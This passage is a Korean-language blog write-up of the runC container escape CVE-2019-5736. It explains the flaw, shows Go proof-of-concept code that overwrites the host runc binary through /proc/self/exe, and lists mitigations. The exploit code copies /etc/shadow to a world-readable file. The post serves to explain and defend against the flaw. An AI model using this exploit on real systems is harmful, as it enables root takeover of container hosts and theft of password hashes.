-  &lt;li&gt;runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;기본 구성 및 역할에 대하여 알아봤고 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 기본적인 기술이며 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다. &lt;strong&gt;runC&lt;/strong&gt;는 Docker, containerd, Podman 및 CRI-O가있는 &lt;strong&gt;컨테이너의 기본 런타임&lt;/strong&gt;으로 사용됩니다.&lt;/p&gt;
-
-&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;
-
-&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;
-
-&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;
-
-&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;Host Server&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
-다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-5.png&quot; alt=&quot;[그림 5736-5]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;Host Server&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;
-
-&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;Host Server&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;
-
-&lt;p&gt;어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var payload = &quot;#!/bin/bash \n cat /etc/shadow &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow&quot;
-
-func main() {
-	fd, err := os.Create(&quot;/bin/sh&quot;)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
-	err = fd.Close()
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;우선 &lt;strong&gt;Container&lt;/strong&gt;에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다.&lt;/p&gt;
-
-&lt;p&gt;1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.&lt;/p&gt;
-
-&lt;p&gt;코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.&lt;/p&gt;
-
-&lt;p&gt;위 코드의 동작을 해석 하자면 9라인의 &lt;strong&gt;#!/proc/self/exe(&lt;/strong&gt;해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 &lt;strong&gt;커널&lt;/strong&gt;이 만든 &lt;strong&gt;심볼릭 링크&lt;/strong&gt;입니다.&lt;strong&gt;)&lt;/strong&gt;는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 &lt;strong&gt;runC&lt;/strong&gt;입니다.
-다시 정리 해본다면, Host에서 Container의 /bin/sh을 &lt;strong&gt;docker exec&lt;/strong&gt;를 통해 실행 하는데 이 때 &lt;strong&gt;runC&lt;/strong&gt;가 사용 됩니다. 결국 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt;가 가리키는 놈은 &lt;strong&gt;Host의 runC&lt;/strong&gt;가 되고 &lt;strong&gt;/bin/sh&lt;/strong&gt;는 결국 Host의 &lt;strong&gt;runC&lt;/strong&gt;가 됩니다.
-여기가 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점의 주요 원인이라 판단이 됩니다. &lt;strong&gt;/proc/self/exe&lt;/strong&gt;가 가리키는 것에 대해서 &lt;strong&gt;부적절하게 처리함&lt;/strong&gt;으로서 위와 같은 행위가 가능해 지는것이죠.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var found int
-	for found == 0 {
-		pids, err := ioutil.ReadDir(&quot;/proc&quot;)
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		for _, f := range pids {
-			fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
-			fstring := string(fbytes)
-			if strings.Contains(fstring, &quot;runc&quot;) {
-				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
-				found, err = strconv.Atoi(f.Name())
-				if err != nil {
-					fmt.Println(err)
-					return
-				}
-			}
-		}
-	}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 &lt;strong&gt;runC의 PID를 찾기위한 코드&lt;/strong&gt;입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
-즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var handleFd = -1
-	for handleFd == -1 {
-		handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
-		if int(handle.Fd()) &amp;gt; 0 {
-			handleFd = int(handle.Fd())
-		}
-	}
-	fmt.Println(&quot;[+] Successfully got the file handle&quot;)
-
-	for {
-		writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
-		if int(writeHandle.Fd()) &amp;gt; 0 {
-			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
-			writeHandle.Write([]byte(payload))
-			return
-		}
-	}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 &lt;strong&gt;/proc/self/fd/파일 서술자&lt;/strong&gt;의 &lt;strong&gt;파일 핸들&lt;/strong&gt;을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;위에서의 과정에서 보이듯 &lt;strong&gt;rudC&lt;/strong&gt;의 &lt;strong&gt;파일 서술자(/proc/self/exe)&lt;/strong&gt;에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;
-
-&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
-전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;…….&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;
-
-&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;
-
-&lt;p&gt;감사합니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
-  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
-  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
-  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
-  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
-  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
-  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
-  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
-  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
-&lt;/ul&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Sulla</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="Posts" />
-      
-
-      
-        <summary type="html">CVE-2019-5736 (runC Container 취약점)</summary>
       
 
       
